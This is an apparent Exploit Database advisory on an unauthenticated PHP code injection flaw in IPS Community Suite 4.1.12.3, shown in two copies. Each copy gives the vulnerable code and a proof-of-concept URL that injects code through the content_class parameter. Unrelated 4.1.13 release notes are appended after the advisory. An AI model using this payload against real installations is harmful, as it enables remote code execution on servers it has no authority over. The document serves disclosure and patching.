# IPS Community Suite <= 4.1.12.3 Autoloaded PHP Code Injection Vulnerability

#### â¢ Software Link:

<https://invisionpower.com>

#### â¢ Affected Versions:

Version 4.1.12.3 and prior versions.

#### â¢ Vulnerability Description:

The vulnerable code is located in the **/applications/core/modules/front/system/content.php** script:

```
38$class = 'IPS\\' . implode( '\\', explode( '_', \IPS\Request::i()->content_class ) );
39
40if ( ! class_exists( $class ) or ! in_array( 'IPS\Content', class_parents( $class ) ) )
41{
42    \IPS\Output::i()->error( 'node_error', '2S226/2', 404, '' );
43}
```

User input passed through the **“content\_class”** request parameter is not properly sanitized before being used in a call to the `class_exists()` PHP function at line 40. This could be exploited by unauthenticated attackers to inject and execute arbitrary PHP code leveraging the autoloading function defined into the **/applications/cms/Application.php** script:

```
171if ( mb_substr( $class, 0, 14 ) === 'IPS\cms\Fields' and is_numeric( mb_substr( $class, 14, 1 ) ) )
172{
173    $databaseId = mb_substr( $class, 14 );
174    eval( "namespace IPS\\cms; class Fields{$databaseId} extends Fields { public static \$customDatabaseId = $databaseId; }" );
175}
```
#### â¢ Proof of Concept:

```
[http://[host]/[ips]/index.php?app=core&module=system&controller=content&do=find&content_class=cms\Fields1{}phpinfo();/*

```
#### â¢ Solution:

Update to version 4.1.13 or later.

#### â¢ Disclosure Timeline:

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

```
---------------------------------------------------------------------------
IPS Community Suite <= 4.1.12.3 Autoloaded PHP Code Injection Vulnerability
---------------------------------------------------------------------------

[-] Software Link:

<https://invisionpower.com/>

[-] Affected Versions:

Version 4.1.12.3 and prior versions.

[-] Vulnerability Description:

The vulnerable code is located in the /applications/core/modules/front/system/content.php script:

38.     $class = 'IPS\\' . implode( '\\', explode( '_', \IPS\Request::i()->content_class ) );
39.
40.     if ( ! class_exists( $class ) or ! in_array( 'IPS\Content', class_parents( $class ) ) )
41.     {
42.         \IPS\Output::i()->error( 'node_error', '2S226/2', 404, '' );
43.     }

User input passed through the "content_class" request parameter is not properly sanitized before being used in a call
to the "class_exists()" function at line 40. This could be exploited by unauthenticated attackers to inject and execute
arbitrary PHP code leveraging the autoloading function defined into the /applications/cms/Application.php script:

171.    if ( mb_substr( $class, 0, 14 ) === 'IPS\cms\Fields' and is_numeric( mb_substr( $class, 14, 1 ) ) )
172.    {
173.        $databaseId = mb_substr( $class, 14 );
174.        eval( "namespace IPS\\cms; class Fields{$databaseId} extends Fields { public static \$customDatabaseId [...]
175.    }

Successful exploitation of this vulnerability requires the application running on PHP before version 5.4.24 or 5.5.8.

[-] Proof of Concept:

http://[host]/[ips]/index.php?app=core&module=system&controller=content&do=find&content_class=cms\Fields1{}phpinfo();/*

[-] Solution:

Update to version 4.1.13 or later.

[-] Disclosure Timeline:

* Released 07/05/2016
* Current release: No
* Beta release: No
* Soft release: No

This is a maintenance release to fix reported issues and add refinement to existing features. This release also contains a security improvement for older versions of PHP.

In a recent change to their API, Google now requires an API Key to access their Maps API. After upgrading to 4.1.13, follow our [Google Maps guide](https://invisioncommunity.com/4guides/how-to-use-ips-community-suite/managing-your-community/community-enhancements-google-maps-r270/) to restore this integration. This is especially recommended if you are using Commerce which uses the API for address input autocompletion.

In addition to bug fixes and performance improvements, this release also includes following enhancements

* New per-group setting to highlight posts made by certain groups. 2 theme settings control the color and border, which are editable in the easy theme editor.
* New setting to make providing a billing address optional for purchases in Commerce.
* Personal conversation management improvements:
  + Can now filter personal conversations to just read/unread.
  + Can now move multiple personal conversations into a different folder at once.
  + Can search by recipient/sender name.
* Notifications about Calendar events now include the event date.
* New setting to control which images sizes should have a watermark applied in Gallery.
* New setting to control which IP pool to use for SparkPost if you have purchased dedicated IP addresses.
* Better handling of upgrades if files have been modified.
* The sidebar widget for showing Downloads files can now show just free or paid files.
* When searching templates or CSS files in the AdminCP template editor, it will search for templates or CSS files with a name matching the term provided, in addition to searching the content of them.
* When viewing a log in the AdminCP, it will now show you on which page the log occurred and by which member.
* When the search index is being rebuilt, a message is now shown on the search results page to indicate why results may not be complete.
* The "details" modal for applications and plugins now has a tab which shows the hooks associated with that application or plugin.
* The placeholders that display on date/time inputs (e.g. "HH:MM") can now be translated.
* Rebuilding the search index, and rebuilding posts after a 3.x upgrade now processes newest posts first for a more user-friendly experience after upgrading.
* When a file is deleted, a log is created and a new setting controls how to keep these logs for.

**The following Pages features are also included:**

* HTML pages are now editable via Designer's mode.
* Ability to rename, or delete a group of Database templates
* Ability to ensure the Page's title remains in all database generated links (categories, records, forms, etc)
* Reciprocal linking when using relational fields
* Date and time fields, and Yes/No fields are now filterable.
* Filterable custom fields now available when creating a record feed block
* Ability to make some custom fields unique, so that only one record per database can have the same value.
* Ability to delete a folder in the media manager
* Ability to use $record->field\_key\_name\_here programatically to get and set values, instead of relying on $record->field\_11 which may change when you export and import databases.

**Information for 3rd party designers**

The new feature to highlight posts made by members in a particular post adds to the article.ipsComment element a .ipsComment\_highlighted class and a data-memberGroup attribute with the group ID (so a site could do different colors for different groups, though the default implementation does not do this). On the default theme, the new CSS is:

```

/* HIGHLIGHTED REPLIES */
.ipsComment_highlighted.ipsBox:not(.ipsBox_transparent):not(.ipsModerated):not(.ipsComment_selected),
.ipsComment_highlighted:not(.ipsBox_transparent):not(.ipsModerated):not(.ipsComment_selected) .ipsAreaBackground_reset {
	background-color: {theme="post_highlight"};
}
.ipsComment_highlighted:not(.ipsBox_transparent):not(.ipsModerated):not(.ipsComment_selected) {
	background-color: {theme="post_highlight"};
	border:1px solid {theme="post_highlight_border"};
}
```

**Information for 3rd party developers**

* There have been some changes to FrontNavigation extensions. Contributors can read more about this here: [https://invisionpower.com/forums/topic/430560-4113-frontnavigation-extension-changes/](https://invisioncommunity.com/forums/topic/430560-4113-frontnavigation-extension-changes/)
* There have been some changes to how versions are managed for applications and plugins. Contributors can read more about this here: [https://invisionpower.com/forums/topic/430105-4113-versioning-improvements/](https://invisioncommunity.com/forums/topic/430105-4113-versioning-improvements/)
* There have been some changes to Commerce gateways. Contributors can read more about this here: [https://invisionpower.com/forums/topic/430574-4113-gateway-changes/](https://invisioncommunity.com/forums/topic/430574-4113-gateway-changes/)
* Currently, when a queue task is finished, it should throw an OutOfRangeException or return NULL. This is deprecated and 3rd party developers should update any queue tasks in their apps to throw an instance of \IPS\Task\Queue\OutOfRangeException instead.
* jQuery has been updated to 1.12.4.
* FontAwesome has been updated to 4.6.3.
* CodeMirror has been updated to 5.15.
* The number of results to show in a member search has been moved to an instance property of the \IPS\core\modules\front\search class for easier hooking.
* \IPS\Request::confirmedDelete() now has parameters to customise the message that is displayed.
